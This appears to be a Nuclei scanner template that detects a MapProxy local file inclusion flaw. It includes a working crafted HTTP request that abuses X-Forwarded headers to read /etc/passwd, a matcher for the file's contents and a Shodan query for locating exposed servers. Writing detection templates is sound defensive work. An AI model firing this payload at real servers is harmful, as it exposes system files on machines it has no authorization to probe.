http:
- matchers:
  - condition: and
    part: body
    regex:
    - 'root:.*:0:0:'
    - MapProxy
    type: regex
  - status:
    - 200
    type: status
  matchers-condition: and
  payloads:
    path:
    - /
    - /demo
  raw:
  - 'GET {{path}}?wms_capabilities&type=external HTTP/1.1

    Host: {{Hostname}}

    X-Forwarded-Proto: file

    X-Forwarded-Host: ///etc/passwd#.xml

    '
id: mapproxy-file-read
info:
  author: xbow,DhiyaneshDk
  classification:
    cwe-id: CWE-22
  description: 'MapProxy improperly validates and processes X-Forwarded headers, allowing
    attackers to construct file:// URLs that bypass access controls and read local
    files through local file inclusion vulnerability.

    '
  impact: 'An attacker can exploit this vulnerability to read sensitive local files
    like /etc/passwd, configuration files, and other system files, potentially exposing
    sensitive information.

    '
  metadata:
    max-request: 1
    product: mapproxy
    shodan-query: html:"MapProxy"
    vendor: mapproxy
    verified: true
  name: MapProxy - Local File Inclusion
  reference:
  - https://github.com/mapproxy/mapproxy
  - https://mapproxy.org
  remediation: 'Update MapProxy to a patched version that properly validates X-Forwarded
    headers and restricts file:// URL schemes in proxy configurations.

    '
  severity: high
  tags: mapproxy,oss,lfi,misconfig,vuln
